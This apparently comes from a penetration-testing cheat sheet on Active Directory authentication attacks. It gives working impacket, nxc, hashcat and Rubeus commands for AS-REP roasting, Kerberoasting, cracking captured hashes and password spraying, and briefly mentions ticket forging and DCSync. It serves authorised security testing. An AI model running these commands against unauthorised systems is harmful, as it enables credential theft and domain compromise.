# AD authentication checks

[← Active Directory quick reference](../05-active-directory.md)

Check lockout policy and existing failure count before password tests.

Use the [resultant/fine-grained policy checks](powerview.md#password-and-lockout-policy), not only the domain default. Failure counters and visibility can differ between DCs; a stale zero count is not a spraying allowance. Record the chosen DC, account state, threshold/observation window, and previous attempts.

```bash
nxc smb <dc-ip> -u <user> -p '<password>' --pass-pol
```

## AS-REP roasting

AS-REP: known/scoped users without Kerberos pre-auth:

```bash
impacket-GetNPUsers <domain.tld>/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
nxc ldap <dc-ip> -u <user> -p '<password>' --asreproast hashes.asreproast
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

`18200` above applies to etype 23 AS-REP output. Inspect the emitted format/encryption before selecting a cracking mode.

## Kerberoasting

Kerberoast: user-backed SPNs; machine/managed-service passwords are usually poor crack targets.

```bash
impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain.tld>/<user>
nxc ldap <dc-ip> -u <user> -p '<password>' --kerberoasting hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

`13100` applies to etype 23 TGS output; AES TGS types 17/18 use `19600`/`19700`. Match [Hashcat's actual format examples](https://hashcat.net/wiki/doku.php?id=example_hashes). Microsoft's 2026 DC updates change assumed supported service-ticket encryption for accounts without an explicit configuration; RC4 examples remain dependent on observed account/DC settings. [Kerberos default-encryption changes](https://support.microsoft.com/en-us/servicing/os/windows/2025/11/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2).

From a Windows shell with a matching Rubeus version:

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe kerberoast /outfile:kerb.txt
```

Scope collection to the intended accounts using installed help, and interpret output formats rather than blindly use a fixed mode. [Rubeus roasting documentation](https://github.com/GhostPack/Rubeus).

Spray one candidate across a scoped list only after checking lockout state:

```bash
nxc smb <dc-ip> -u users.txt -p '<candidate>' --continue-on-success
```

## Ticket and replication checks

Silver: service hash + domain SID + target SPN. Golden: `krbtgt` key.

DCSync requires directory replication rights; follow [DC credential access](credential-access.md#dcsync-inspect-rights-and-select-the-account) for scoped collection. [Ticket handling](tickets.md) owns cache and forging workflows.

Track credential source/account/service. NetNTLMv2 ≠ passable NT hash.
